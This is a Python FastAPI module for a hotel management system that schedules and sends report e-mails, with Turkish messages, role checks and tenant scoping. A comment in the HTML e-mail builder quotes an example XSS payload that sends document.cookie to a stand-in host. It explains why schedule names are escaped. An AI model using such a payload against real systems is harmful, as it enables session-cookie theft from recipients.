"""
Report Email Scheduler — Otomatik Rapor E-posta Zamanlayici
============================================================
Endpoints:
  POST   /api/report-scheduler/schedules          — Yeni zamanlama olustur
  GET    /api/report-scheduler/schedules          — Tüm zamanlamalari listele
  GET    /api/report-scheduler/schedules/{id}     — Tek zamanlama detayi
  PUT    /api/report-scheduler/schedules/{id}     — Zamanlama guncelle
  DELETE /api/report-scheduler/schedules/{id}     — Zamanlama sil
  POST   /api/report-scheduler/schedules/{id}/toggle — Aktif/pasif toggle
  POST   /api/report-scheduler/schedules/{id}/send-now — Manuel tetikleme
  GET    /api/report-scheduler/history            — Gönderim gecmisi
  GET    /api/report-scheduler/history/{id}       — Tek gönderim detayi
  POST   /api/report-scheduler/history/{id}/retry — Başarısız gönderimleri tekrar dene
  GET    /api/report-scheduler/report-types       — Mevcut rapor tipleri
"""
import logging
import re as _re
import traceback
import uuid
from datetime import UTC, datetime, timedelta

from fastapi import APIRouter, Depends, HTTPException, Query
from pydantic import BaseModel, Field

from cache_manager import cache as _cache
from cache_manager import cached
from core.database import db
from core.security import _is_super_admin, get_current_user
from models.enums import UserRole
from models.schemas import User
from modules.pms_core.role_permission_service import require_op  # v98 DW


def _invalidate_scheduler_cache(tenant_id: str) -> None:
    """Drop scheduler list/history caches for a tenant after writes."""
    for prefix in ("report_scheduler_schedules", "report_scheduler_history"):
        try:
            _cache.safe_invalidate(tenant_id, prefix)
        except Exception as e:  # pragma: no cover — best-effort
            logger.debug("scheduler cache invalidation skipped (%s): %s", prefix, e)

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api/report-scheduler", tags=["Report Scheduler"])

HOTEL_ROLES = {
    UserRole.SUPER_ADMIN, UserRole.ADMIN,
    "super_admin", "admin", "manager", "staff",
}

MANAGER_ROLES = {
    UserRole.SUPER_ADMIN, UserRole.ADMIN,
    "super_admin", "admin", "manager",
}


def _require_hotel_role(user: User):
    if _is_super_admin(user):
        return
    if user.role in HOTEL_ROLES:
        return
    extra_roles = getattr(user, "roles", None) or []
    if isinstance(extra_roles, list) and any((r in HOTEL_ROLES) for r in extra_roles):
        return
    raise HTTPException(status_code=403, detail="Bu sayfaya erisim yetkiniz yok.")


def _require_manager_role(user: User):
    if _is_super_admin(user):
        return
    if user.role in MANAGER_ROLES:
        return
    extra_roles = getattr(user, "roles", None) or []
    if isinstance(extra_roles, list) and any((r in MANAGER_ROLES) for r in extra_roles):
        return
    raise HTTPException(status_code=403, detail="Bu islemi yapmak icin yonetici yetkisi gereklidir.")


REPORT_TYPES = [
    {"key": "daily_summary", "label": "Günlük Özet Raporu", "description": "Günlük doluluk, gelir ve operasyon özeti"},
    {"key": "revenue", "label": "Gelir Raporu", "description": "Detaylı gelir analizi ve kıyaslama"},
    {"key": "occupancy", "label": "Doluluk Raporu", "description": "Oda doluluk oranları ve trendler"},
    {"key": "reservations", "label": "Rezervasyon Raporu", "description": "Rezervasyon listesi ve istatistikler"},
    {"key": "guest_analytics", "label": "Misafir Analitik", "description": "Misafir profili ve dağılım raporları"},
    {"key": "adr_revpar", "label": "ADR / RevPAR", "description": "Ortalama günlük fiyat ve oda başına gelir"},
    {"key": "channel_performance", "label": "Kanal Performansı", "description": "OTA ve satış kanalı bazlı analiz"},
    {"key": "b2b_analytics", "label": "B2B Analitik", "description": "Acente ve API kullanım analitikleri"},
    {"key": "housekeeping", "label": "Housekeeping Raporu", "description": "Kat hizmetleri performans raporu"},
    {"key": "financial", "label": "Finansal Rapor", "description": "Genel muhasebe ve folio özeti"},
    {"key": "flash_report", "label": "Flash Report", "description": "Anlık operasyon durum raporu"},
]

FREQUENCY_OPTIONS = ["daily", "weekly", "monthly"]
FORMAT_OPTIONS = ["pdf", "csv", "link"]
DAYS_OF_WEEK = ["monday", "tuesday", "wednesday", "thursday", "friday", "saturday", "sunday"]


class ScheduleCreate(BaseModel):
    name: str = Field(..., min_length=1, max_length=200)
    report_type: str
    frequency: str
    recipients: list[str] = Field(..., min_items=1)
    format: str = "pdf"
    send_time: str = "08:00"
    day_of_week: str | None = None
    day_of_month: int | None = None
    include_charts: bool = True
    notes: str | None = None
    date_range: str = "auto"


class ScheduleUpdate(BaseModel):
    name: str | None = None
    report_type: str | None = None
    frequency: str | None = None
    recipients: list[str] | None = None
    format: str | None = None
    send_time: str | None = None
    day_of_week: str | None = None
    day_of_month: int | None = None
    include_charts: bool | None = None
    notes: str | None = None
    is_active: bool | None = None
    date_range: str | None = None


_TIME_RE = _re.compile(r"^([01]\d|2[0-3]):[0-5]\d$")
_EMAIL_RE = _re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")


def _get_tenant_id(user: User) -> str:
    return getattr(user, "tenant_id", "default")


async def _get_schedule_for_tenant(schedule_id: str, user: User) -> dict:
    schedule = await db.report_schedules.find_one({
        "_id": schedule_id,
        "tenant_id": _get_tenant_id(user),
    })
    if not schedule:
        raise HTTPException(status_code=404, detail="Zamanlama bulunamadi")
    return schedule


async def _get_history_for_tenant(history_id: str, user: User) -> dict:
    entry = await db.report_schedule_history.find_one({
        "_id": history_id,
        "tenant_id": _get_tenant_id(user),
    })
    if not entry:
        raise HTTPException(status_code=404, detail="Gönderim kaydi bulunamadi")
    return entry


def _validate_schedule_fields(data: dict):
    if data.get("report_type") and data["report_type"] not in [r["key"] for r in REPORT_TYPES]:
        raise HTTPException(status_code=400, detail=f"Gecersiz rapor tipi: {data['report_type']}")
    if data.get("frequency") and data["frequency"] not in FREQUENCY_OPTIONS:
        raise HTTPException(status_code=400, detail=f"Gecersiz frekans: {data['frequency']}")
    if data.get("format") and data["format"] not in FORMAT_OPTIONS:
        raise HTTPException(status_code=400, detail=f"Gecersiz format: {data['format']}")
    if data.get("send_time") and not _TIME_RE.match(data["send_time"]):
        raise HTTPException(status_code=400, detail="Gecersiz saat formati, HH:MM olmalidir")
    if data.get("day_of_week") and data["day_of_week"] not in DAYS_OF_WEEK:
        raise HTTPException(status_code=400, detail=f"Gecersiz gun: {data['day_of_week']}")
    if data.get("day_of_month") is not None:
        if not (1 <= data["day_of_month"] <= 28):
            raise HTTPException(status_code=400, detail="Ayin gunu 1-28 arasi olmalidir")
    if data.get("recipients"):
        for email in data["recipients"]:
            if not _EMAIL_RE.match(email):
                raise HTTPException(status_code=400, detail=f"Gecersiz e-posta: {email}")


def _compute_next_run(frequency: str, send_time: str, day_of_week: str | None, day_of_month: int | None) -> str:
    now = datetime.now(UTC)
    hour, minute = (int(x) for x in send_time.split(":"))

    if frequency == "daily":
        next_run = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
        if next_run <= now:
            next_run += timedelta(days=1)
    elif frequency == "weekly":
        target_day = DAYS_OF_WEEK.index(day_of_week or "monday")
        days_ahead = target_day - now.weekday()
        if days_ahead <= 0:
            days_ahead += 7
        next_run = (now + timedelta(days=days_ahead)).replace(hour=hour, minute=minute, second=0, microsecond=0)
    elif frequency == "monthly":
        dom = day_of_month or 1
        next_run = now.replace(day=dom, hour=hour, minute=minute, second=0, microsecond=0)
        if next_run <= now:
            month = now.month + 1
            year = now.year
            if month > 12:
                month = 1
                year += 1
            next_run = next_run.replace(year=year, month=month)
    else:
        next_run = now + timedelta(days=1)

    return next_run.isoformat()


@router.get("/report-types")
@cached(ttl=3600, key_prefix="report_scheduler_types")  # static lookup, 1h
async def get_report_types(current_user: User = Depends(get_current_user)):
    _require_hotel_role(current_user)
    return {"report_types": REPORT_TYPES, "frequencies": FREQUENCY_OPTIONS, "formats": FORMAT_OPTIONS, "days_of_week": DAYS_OF_WEEK}


@router.post("/schedules")
async def create_schedule(body: ScheduleCreate, current_user: User = Depends(get_current_user),
    _perm=Depends(require_op("view_reports")),  # v98 DW
):
    _require_manager_role(current_user)

    data = body.model_dump()
    _validate_schedule_fields(data)

    schedule = {
        "_id": str(uuid.uuid4()),
        "tenant_id": _get_tenant_id(current_user),
        "created_by": current_user.email,
        "created_by_name": getattr(current_user, "name", current_user.email),
        "created_at": datetime.now(UTC).isoformat(),
        "updated_at": datetime.now(UTC).isoformat(),
        "is_active": True,
        "next_run": _compute_next_run(data["frequency"], data["send_time"], data.get("day_of_week"), data.get("day_of_month")),
        "total_sent": 0,
        "total_failed": 0,
        "last_sent_at": None,
        "last_status": None,
        **data,
    }

    await db.report_schedules.insert_one(schedule)
    logger.info(f"Schedule created: {schedule['_id']} by {current_user.email}")
    _invalidate_scheduler_cache(_get_tenant_id(current_user))
    return {"message": "Zamanlama olusturuldu", "schedule": schedule}


@router.get("/schedules")
@cached(ttl=60, key_prefix="report_scheduler_schedules")
async def list_schedules(
    current_user: User = Depends(get_current_user),
    _nocache: bool = Query(False, alias="nocache"),
):
    _require_hotel_role(current_user)

    cursor = db.report_schedules.find({"tenant_id": _get_tenant_id(current_user)}).sort("created_at", -1)
    schedules = await cursor.to_list(length=200)
    return {"schedules": schedules, "total": len(schedules)}


@router.get("/schedules/{schedule_id}")
async def get_schedule(schedule_id: str, current_user: User = Depends(get_current_user)):
    _require_hotel_role(current_user)

    schedule = await _get_schedule_for_tenant(schedule_id, current_user)
    return {"schedule": schedule}


@router.put("/schedules/{schedule_id}")
async def update_schedule(schedule_id: str, body: ScheduleUpdate, current_user: User = Depends(get_current_user),
    _perm=Depends(require_op("view_reports")),  # v98 DW
):
    _require_manager_role(current_user)

    schedule = await _get_schedule_for_tenant(schedule_id, current_user)

    updates = {k: v for k, v in body.model_dump().items() if v is not None}
    _validate_schedule_fields(updates)

    if any(k in updates for k in ("frequency", "send_time", "day_of_week", "day_of_month")):
        freq = updates.get("frequency", schedule["frequency"])
        st = updates.get("send_time", schedule["send_time"])
        dow = updates.get("day_of_week", schedule.get("day_of_week"))
        dom = updates.get("day_of_month", schedule.get("day_of_month"))
        updates["next_run"] = _compute_next_run(freq, st, dow, dom)

    updates["updated_at"] = datetime.now(UTC).isoformat()
    await db.report_schedules.update_one({"_id": schedule_id}, {"$set": updates})

    updated = await db.report_schedules.find_one({"_id": schedule_id})
    _invalidate_scheduler_cache(_get_tenant_id(current_user))
    return {"message": "Zamanlama guncellendi", "schedule": updated}


@router.delete("/schedules/{schedule_id}")
async def delete_schedule(schedule_id: str, current_user: User = Depends(get_current_user),
    _perm=Depends(require_op("view_reports")),  # v98 DW
):
    _require_manager_role(current_user)

    await _get_schedule_for_tenant(schedule_id, current_user)
    await db.report_schedules.delete_one({"_id": schedule_id})

    await db.report_schedule_history.delete_many({"schedule_id": schedule_id})
    _invalidate_scheduler_cache(_get_tenant_id(current_user))
    return {"message": "Zamanlama silindi"}


@router.post("/schedules/{schedule_id}/toggle")
async def toggle_schedule(schedule_id: str, current_user: User = Depends(get_current_user),
    _perm=Depends(require_op("view_reports")),  # v98 DW
):
    _require_manager_role(current_user)

    schedule = await _get_schedule_for_tenant(schedule_id, current_user)

    new_status = not schedule.get("is_active", True)
    updates = {"is_active": new_status, "updated_at": datetime.now(UTC).isoformat()}
    if new_status:
        updates["next_run"] = _compute_next_run(
            schedule["frequency"], schedule["send_time"],
            schedule.get("day_of_week"), schedule.get("day_of_month"),
        )

    await db.report_schedules.update_one({"_id": schedule_id}, {"$set": updates})
    _invalidate_scheduler_cache(_get_tenant_id(current_user))
    return {"message": f"Zamanlama {'aktif' if new_status else 'pasif'} edildi", "is_active": new_status}


@router.post("/schedules/{schedule_id}/send-now")
async def send_now(schedule_id: str, current_user: User = Depends(get_current_user),
    _perm=Depends(require_op("view_reports")),  # v98 DW
):
    _require_manager_role(current_user)

    schedule = await _get_schedule_for_tenant(schedule_id, current_user)

    result = await _execute_schedule(schedule, triggered_by=current_user.email)
    _invalidate_scheduler_cache(_get_tenant_id(current_user))
    return result


@router.get("/history")
@cached(ttl=60, key_prefix="report_scheduler_history")
async def get_history(
    schedule_id: str | None = Query(None),
    status: str | None = Query(None),
    limit: int = Query(50, le=200),
    current_user: User = Depends(get_current_user),
    _nocache: bool = Query(False, alias="nocache"),
):
    _require_hotel_role(current_user)

    query = {"tenant_id": _get_tenant_id(current_user)}
    if schedule_id:
        query["schedule_id"] = schedule_id
    if status:
        query["status"] = status

    cursor = db.report_schedule_history.find(query).sort("sent_at", -1).limit(limit)
    history = await cursor.to_list(length=limit)
    return {"history": history, "total": len(history)}


@router.get("/history/{history_id}")
async def get_history_detail(history_id: str, current_user: User = Depends(get_current_user)):
    _require_hotel_role(current_user)

    entry = await _get_history_for_tenant(history_id, current_user)
    return {"entry": entry}


@router.post("/history/{history_id}/retry")
async def retry_send(history_id: str, current_user: User = Depends(get_current_user),
    _perm=Depends(require_op("view_reports")),  # v98 DW
):
    _require_manager_role(current_user)

    entry = await _get_history_for_tenant(history_id, current_user)

    if entry.get("status") != "failed":
        raise HTTPException(status_code=400, detail="Sadece başarısız gönderimler tekrar denenebilir")

    schedule = await _get_schedule_for_tenant(entry["schedule_id"], current_user)

    await db.report_schedule_history.update_one(
        {"_id": history_id},
        {"$set": {"status": "retrying", "retry_count": entry.get("retry_count", 0) + 1}},
    )

    result = await _execute_schedule(schedule, triggered_by=current_user.email, history_id=history_id)
    _invalidate_scheduler_cache(_get_tenant_id(current_user))
    return result


async def _execute_schedule(schedule: dict, triggered_by: str = "system", history_id: str | None = None):
    now = datetime.now(UTC)
    report_type_info = next((r for r in REPORT_TYPES if r["key"] == schedule["report_type"]), None)
    report_label = report_type_info["label"] if report_type_info else schedule["report_type"]

    hid = history_id or str(uuid.uuid4())

    history_entry = {
        "_id": hid,
        "schedule_id": schedule["_id"],
        "schedule_name": schedule["name"],
        "tenant_id": schedule.get("tenant_id", "default"),
        "report_type": schedule["report_type"],
        "report_label": report_label,
        "format": schedule.get("format", "pdf"),
        "recipients": schedule["recipients"],
        "triggered_by": triggered_by,
        "sent_at": now.isoformat(),
        "status": "processing",
        "error_message": None,
        "retry_count": 0,
        "delivery_details": {},
    }

    if not history_id:
        await db.report_schedule_history.insert_one(history_entry)

    try:
        from modules.messaging.email_service import email_service

        subject = f"Syroce Rapor: {report_label} - {now.strftime('%d.%m.%Y')}"
        html_content = _build_report_email_html(schedule, report_label, now)
        text_content = f"{report_label}\nTarih: {now.strftime('%d.%m.%Y %H:%M')}\nFormat: {schedule.get('format', 'pdf')}"

        sent_count = 0
        failed_recipients = []
        for recipient in schedule["recipients"]:
            try:
                if email_service.mode == "production" and email_service.smtp_username:
                    success = email_service._send_email_smtp(recipient, subject, html_content, text_content)
                else:
                    logger.info(f"[MOCK] Report email -> {recipient}: {subject}")
                    success = True

                if success:
                    sent_count += 1
                else:
                    failed_recipients.append(recipient)
            except Exception as e:
                logger.error(f"Email send failed to {recipient}: {e}")
                failed_recipients.append(recipient)

        if failed_recipients and sent_count == 0:
            status = "failed"
            error_msg = f"Tüm alıcılara gönderim başarısız: {', '.join(failed_recipients)}"
        elif failed_recipients:
            status = "partial"
            error_msg = f"Bazi alıcılara gonderilemedi: {', '.join(failed_recipients)}"
        else:
            status = "sent"
            error_msg = None

        await db.report_schedule_history.update_one(
            {"_id": hid},
            {"$set": {
                "status": status,
                "error_message": error_msg,
                "delivery_details": {
                    "sent_count": sent_count,
                    "failed_count": len(failed_recipients),
                    "failed_recipients": failed_recipients,
                },
            }},
        )

        await db.report_schedules.update_one(
            {"_id": schedule["_id"]},
            {"$set": {
                "last_sent_at": now.isoformat(),
                "last_status": status,
                "updated_at": now.isoformat(),
            },
             "$inc": {
                 "total_sent": sent_count,
                 "total_failed": len(failed_recipients),
             }},
        )

        return {
            "message": f"Rapor gönderimi tamamlandi ({status})",
            "status": status,
            "sent_count": sent_count,
            "failed_count": len(failed_recipients),
            "history_id": hid,
        }

    except Exception as e:
        error_msg = f"Rapor gönderim hatasi: {str(e)}"
        logger.error(f"Schedule execution failed: {e}\n{traceback.format_exc()}")

        await db.report_schedule_history.update_one(
            {"_id": hid},
            {"$set": {"status": "failed", "error_message": error_msg}},
        )
        await db.report_schedules.update_one(
            {"_id": schedule["_id"]},
            {"$set": {"last_status": "failed", "updated_at": now.isoformat()}, "$inc": {"total_failed": 1}},
        )

        return {"message": error_msg, "status": "failed", "history_id": hid}


def _build_report_email_html(schedule: dict, report_label: str, now: datetime) -> str:
    # Bug AQ (April 2026): schedule.name and schedule.notes are user-controlled
    # at /api/reports/schedule create time. Without escaping, an attacker who
    # creates a schedule named `<img src=x onerror=fetch('http://evil/'+document.cookie)>`
    # would land their payload in every recipient's mailbox.
    import html as _html_mod
    def _e(v): return _html_mod.escape("" if v is None else str(v), quote=True)
    fmt = _e(schedule.get("format", "pdf").upper())
    freq_labels = {"daily": "Günlük", "weekly": "Haftalık", "monthly": "Aylık"}
    freq_label = _e(freq_labels.get(schedule.get("frequency", ""), schedule.get("frequency", "")))
    sched_name = _e(schedule.get('name', '-'))
    sched_notes = _e(schedule.get('notes')) if schedule.get('notes') else None
    report_label = _e(report_label)

    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <style>
            body {{ font-family: Arial, sans-serif; line-height: 1.6; color: #333; }}
            .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
            .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                      color: white; padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }}
            .content {{ background: #f9f9f9; padding: 30px; border-radius: 0 0 10px 10px; }}
            .meta-table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
            .meta-table td {{ padding: 8px 12px; border-bottom: 1px solid #eee; }}
            .meta-table td:first-child {{ font-weight: bold; color: #555; width: 40%; }}
            .button {{ background: #667eea; color: white; padding: 12px 24px;
                      text-decoration: none; border-radius: 5px; display: inline-block; margin: 15px 0; }}
            .footer {{ text-align: center; margin-top: 20px; color: #999; font-size: 12px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>{report_label}</h1>
                <p>{freq_label} Otomatik Rapor</p>
            </div>
            <div class="content">
                <p>Merhaba,</p>
                <p>Zamanlanmis raporunuz hazir.</p>
                <table class="meta-table">
                    <tr><td>Rapor</td><td>{report_label}</td></tr>
                    <tr><td>Frekans</td><td>{freq_label}</td></tr>
                    <tr><td>Format</td><td>{fmt}</td></tr>
                    <tr><td>Olusturulma</td><td>{now.strftime('%d.%m.%Y %H:%M')}</td></tr>
                    <tr><td>Zamanlama</td><td>{sched_name}</td></tr>
                </table>
                <p>Raporu goruntulemek icin asagidaki butona tiklayabilirsiniz:</p>
                <p style="text-align: center;">
                    <a href="https://syroce.com/app/raporlar" class="button">Raporu Goruntule</a>
                </p>
                {f'<p><em>Not: {sched_notes}</em></p>' if sched_notes else ''}
            </div>
            <div class="footer">
                <p>Syroce Otel Yonetim Sistemi</p>
                <p>Bu otomatik bir e-postadir. Zamanlamayi degistirmek icin sisteme giris yapiniz.</p>
            </div>
        </div>
    </body>
    </html>
    """
